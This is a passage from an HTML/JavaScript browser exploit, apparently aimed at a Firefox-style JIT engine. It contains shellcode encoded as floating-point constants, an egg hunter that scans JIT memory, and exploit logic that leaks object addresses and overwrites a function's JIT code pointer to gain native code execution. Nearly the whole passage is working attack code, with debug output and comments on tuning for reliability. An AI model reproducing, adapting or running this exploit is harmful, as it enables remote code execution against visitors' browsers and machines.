000002C6944D4B52 | 55                       | push rbp                                |
000002C6944D4B53 | 48:89E5                  | mov rbp,rsp                             |
000002C6944D4B56 | 48:83EC 40               | sub rsp,40                              |
000002C6944D4B5A | 48:83EC 08               | sub rsp,8                               |
000002C6944D4B5E | 40:80E4 F7               | and spl,F7                              |
000002C6944D4B62 | 48:B8 1122334455667788   | mov rax,8877665544332211                |
000002C6944D4B6C | 48:8945 C8               | mov qword ptr ss:[rbp-38],rax           |
000002C6944D4B70 | 48:C7C1 884E0D00         | mov rcx,D4E88                           |
000002C6944D4B77 | E8 F9000000              | call 2C6944D4C75                        |
000002C6944D4B7C | 48:89C7                  | mov rdi,rax                             |
000002C6944D4B7F | 48:C7C2 D2330E00         | mov rdx,E33D2                           |
000002C6944D4B86 | 48:89C1                  | mov rcx,rax                             |
000002C6944D4B89 | E8 46010000              | call 2C6944D4CD4                        |
000002C6944D4B8E | 49:89C5                  | mov r13,rax                             |
000002C6944D4B91 | 4D:31E4                  | xor r12,r12                             |
000002C6944D4B94 | 4D:31F6                  | xor r14,r14                             |
000002C6944D4B97 | 4D:31FF                  | xor r15,r15                             |
000002C6944D4B9A | 4D:85FF                  | test r15,r15                            |
000002C6944D4B9D | 0F85 CD000000            | jne 2C6944D4C70                         |

This this introduces another constaint on JIT spraying beyoond forcing your
assembly bytecode to be 100% valid double floats. You are also limited to a
maximum of 100 doubles (800 bytes) including your egg prefix.
*/

function MutableFunction(){
    Egg = 5.40900888e-315; // AAAA\x00\x00\x00\x00
    S1 = 58394.27801956298;
    S2 = -3.384548150597339e+269;
    S3 = -9.154525457562153e+192;
    S4 = 4.100593930228878e+42;
    S5 = -5.954550387086224e-264;
    S6 = -6.202600666773952e-264;
    S7 = 3.739444822644755e+67;
    S8 = -6.857666270895203e+238;
    S9 = -2.6951286493033994e+35;
    S10 = 1.3116505146398627e+104;
    S11 = -1.311379727091241e+181;
    S12 = 1.1053351980286266e-265;
    S13 = 7.66487078033362e+42;
    S14 = 1.6679557218696946e-235;
    S15 = 1.132763492985646e+27;
    S16 = 9.950469647439759e-114;
    S17 = 2.993090327849682e+272;
    S18 = -5.502851329849395e-291;
    S19 = -8.237146590598179e+238;
    S20 = 6.339162933764338e+42;
    S21 = 3.5294308659369286e+20;
    S22 = 3.3097791266526147e+42;
    S23 = 8.383747910154922e-212;
    S24 = 3.392494399263695e-211;
    S25 = 4.4243988901963e-311;
    S26 = 5.737478799759011e+40;
    S27 = 4.460149307954313e+43;
    S28 = -1.6407721783028692e+212;
    S29 = 4.2382879138769805e-212;
    S30 = 6.900051326148648e+38;
    S31 = 6.805651443326403e+38;
    S32 = 1.2554203505899196e+58;
    S33 = 1.8638376672912672e-307;
    S34 = -2.6441558223761963e-254;
    S35 = -6.037728737751452e-264;
    S36 = -5.192941462066352e+214;
    S37 = 5.92359233693147e+42;
    S38 = 202992.410823677;
    S39 = 2.7838441401041676e+144;
    S40 = -2.7534531600556273e+41;
    S41 = 3.241810206926812e+178;
    S42 = -2.567531759318426e-254;
    S43 = -17.285133915066098;
    S44 = 6.961121445057484e+39;
    S45 = 3.59135655343103e-37;
    S46 = -51196897900298.56;
    S47 = 1.0427542122611611e-268;
    S48 = 2.2699458886304516e-303;
    S49 = 1.0402456670911375e+39;
    S50 = 4.864141155801087e+42;
    S51 = -2.7309109187516972e+16;
    S52 = 6.759742777962091e+81;
    S53 = 3.3282063956567117e+65;
    S54 = -1.917014644290854e+131;
    S55 = -7.781082138582826e-293;
    S56 = 2.8265653635714432e-71;
    S57 = 1.0455220592355552e+43;
    S58 = 9.847087719097727e+26;
    S59 = 9.113124899893579e-153;
    S60 = 1.1339668325500856e+43;
    S61 = 2.782723738792284e+147;
    S62 = -1.6971443112733322e+117;
    S63 = 2.4133951175502064e+39;
    S64 = 2.808795569678157e-71;
    S65 = 1.0555105707058285e+27;
    S66 = 8.17386793398495e+264;
    S67 = -2.400098315721132e-284;
    S68 = -1.1554348699939644e+156;
    S69 = 1.4556863465871746e+39;
    S70 = -53025350.160568245;
    S71 = -6.592137368508742e+232;
    S72 = 1.1134662997366425e-209;
    S73 = -1.7535596773268503e-43;
    S74 = 7.22763477273206e-310;
    S75 = -2.6441558096732702e-254;
    S76 = -8.51157759352546e+115;
    S77 = -2.6958621499901595e+194;
    S78 = 4.246099453321124e+142;
    S79 = 1.2086693094394328e+293;
    S80 = -2.499397870610869e+35;
    S81 = -1.316669776520478e+305;
    S82 = 4.460147900826613e+43;
    S83 = -6.809111833183951e+214;
    S84 = 2.812007786218425e-71;
    S85 = -2.6602204659280166e-48;
    S86 = -7.258072449415565e+91;
    S87 = -3.329861475634748e-283;
    S88 = -4.995198258530426e+163;
    S89 = 4.1458364986e-312;
}

function EggHunter(TargetAddressDbl) {
    HelperDouble[0] = TargetAddressDbl;

    for(i = 0; i < 1000; i++) { // 1000 QWORDs give me the most stable result. The original used 100 which occasionally failed. The most likely explanation for this is that the more code is in the JIT'd Shellcode function (which includes the ASM used to access the floats) the further down into the JIT'd +RX region we will find the double float constant array.
        DblVal = ExplicitLeakDbl(HelperDouble[0]); // The JIT'd ASM code being scanned is likely to contain 8 byte sequences which will not be interpreted as doubles (and will have tagged pointer bits set). Use explicit/strong primitive for these reads.
        
        if(DblVal == 5.40900888e-315) {
            DebugLog("[+] Shellcode offset at 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            HelperDword[0] = HelperDword[0] + 8; // Skip over egg bytes and return precise pointer to the shellcode
            
            return HelperDouble[0];
        }
        
        HelperDword[0] = HelperDword[0] + 8;
    }
    
    return 0.0;
}

function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword & 0xFFFF);
    Unicode += String.fromCharCode(Dword >> 16);
    return Unicode;
}

function QwordToUnicode(Value) {
    return String.fromCharCode.apply(null, [Value.low & 0xffff, (Value.low >> 16) & 0xffff, Value.high & 0xffff, (Value.high >> 16) & 0xffff]);
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for(var i = 0; i < Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

////////
////////
// Primary high level exploit logic
////////

function Exploit() {
    // JIT compile the shellcode and leak its JIT compilation address (this will be within a +RX region of virtual memory)
    
    for(i = 0; i < JITIterations; i++) MutableFunction(); // JIT spray the shellcode
    ShellcodeFuncObjAddress = AttemptLeakObjectAddressDbl(MutableFunction);
    HelperDouble[0] = ShellcodeFuncObjAddress; // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    DebugLog("ShellcodeFuncObjAddress pointer: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    ShellcodeJSFuncObjAddress = HelperDouble[0];
    JITInfoAddress = AttemptLeakDbl(HelperDouble[0]); // In the event that the first AttemptLeakDbl after the first AttemptLeakObjectAddressDbl fails, MutableArray.x will not change from its initialized value of 0x41414141 (this is its value AFTER the +4 shift that occurs in the weak_addrod)
    HelperDouble[0] = JITInfoAddress;
    
    // Verify that MutableArray.x was not its initialized value during the last arbitrary read. This would only be the case if the slots ptr has NEVER been successfully overwritten post-addrof primitive (the address we attempted to read was not a valid double).
    
    if(HelperDword[0] == 0x41414141) {
        HelperDouble[0] = ShellcodeJSFuncObjAddress;
        DebugLog("Arbitrary read primitive failed on address 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        //window.location.reload();
    }
    else {
        // Arbitrary reads (via double) have been successful. Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a 64-bit pointer at offset 0 of this struct)
        
        ShellcodeFuncJITAddress = AttemptLeakDbl(JITInfoAddress);
        HelperDouble[0] = ShellcodeFuncJITAddress;
        DebugLog("Shellcode function object JIT code pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        
        // Due to the VirtualAlloc'd +RX address associated with the JIT'd code nearly always using all 64-bits for its address (as opposed to only 32 of them for stack/heap allocations) leaking it via double the way we have been may be ineffective. Setup a stronger read primitive.
        MutableDblArrayAddress = AttemptLeakObjectAddressDbl(MutableDblArray);
        HelperDouble[0] = MutableDblArrayAddress;
        HelperDword[0] = HelperDword[0] + 56; // Float64Array data pointer
        MutableDblArrayDataPtr = HelperDouble[0];
    
        // Float data within a JIT'd function is stored in isolation and referenced by address from the actual function code. Use an egg hunter to search and a compiled copy of this JIT sprayed shellcode.
        ShellcodeAddress = EggHunter(ShellcodeFuncJITAddress); // For this we need the strong read primitive since values here can start with 0xffff and thus act as tags

        if(ShellcodeAddress) {
            // Trigger code exec by calling the Shellcode function again. Its code pointer has been overwritten to now point to the literal shellcode data within the JIT'd function
            
            DebugLog("Writing shellcode address to JIT Info address...");
            WriteMemDbl(JITInfoAddress, ShellcodeAddress);
            
            /*
            0000001EE15077C0  11 22 33 44 55 66 77 88 74 00 65 00 73 00 74 00  ."3DUfw.t.e.s.t.  <- BSTR addrof leak + arbitrary read on dereferenced pointer at +8 leads precisely here.
            0000001EE15077D0  20 00 73 00 74 00 72 00 69 00 6E 00 67 00 20 00   .s.t.r.i.n.g. .  
            0000001EE15077E0  74 00 65 00 78 00 74 00 2E 00 2E 00 2E 00 20 00  t.e.x.t....... .  
            0000001EE15077F0  73 00 68 00 65 00 6C 00 6C 00 63 00 6F 00 64 00  s.h.e.l.l.c.o.d.  
            0000001EE1507800  65 00 20 00 77 00 69 00 6C 00 6C 00 20 00 67 00  e. .w.i.l.l. .g.  
            0000001EE1507810  6F 00 20 00 68 00 65 00 72 00 65 00 21 00 00 00  o. .h.e.r.e.!...  
            */
            
            var TestStr = TableToUnicode(Shellcode);//"\u2211\u4433\u6655\u8877";
            //TestStr += TableToUnicode(Shellcode);
            TestStr = TestStr.substring(0, TestStr.length);
            //var TestStr = "\u2211\u4433\u6655\u8877test string text... shellcode will go here!"; // Using substr trick did not work, and strings could not be appended to one another within breaking the addrof primitive. Must be all in a single string like this.
            HelperDouble[0] = AttemptLeakObjectAddressDbl(TestStr);
            //HelperDword[0] = HelperDword[0] + 8; // BSTR object itself has the literal unicode string pointer at offset +8 of its struct
            //HelperDouble[0] = ExplicitLeakDbl(HelperDouble[0]);
            DebugLog("BSTR address 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            MutableFunction();
        }
        else {
            DebugLog("Failed to resolve shellcode address");
        }
    }
}

Exploit()
</script>
</body>
</html>
